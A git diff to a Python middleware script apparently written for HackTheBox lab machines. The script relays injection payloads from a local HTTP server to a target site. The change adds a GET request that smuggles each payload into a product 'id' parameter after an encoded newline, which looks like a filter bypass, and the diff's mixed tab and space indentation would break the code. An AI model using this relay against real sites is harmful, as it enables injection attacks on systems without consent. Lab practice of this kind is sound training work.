@@ -2,8 +2,11 @@ from http.server import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 from urllib.parse import unquote, urlparse
 from websocket import create_connection
+import requests
+
 
 ws_server = "ws://soc-player.soccer.htb:9091"
+http_server = "http://soc-player.soccer.htb:9091"
 
 def send_ws(payload):
 	ws = create_connection(ws_server)
@@ -22,6 +25,13 @@ def send_ws(payload):
 		return resp
 	else:
 		return ''
+        
+def send_httpg_get(payload):
+    #this create for ziping.htb
+    query = "?page=product&id=1%0A" + payload + "%231"
+    req = requests.get(http_server+query)
+
+	return req.content.decode("utf-8");
 
 def middleware_server(host_port,content_type="text/plain"):
 
@@ -34,7 +44,8 @@ def middleware_server(host_port,content_type="text/plain"):
 				payload = False
 				
 			if payload:
-				content = send_ws(payload)
+				#content = send_ws(payload)
+                content = send_httpg_get(payload)
 			else:
 				content = 'No parameters specified!'
 
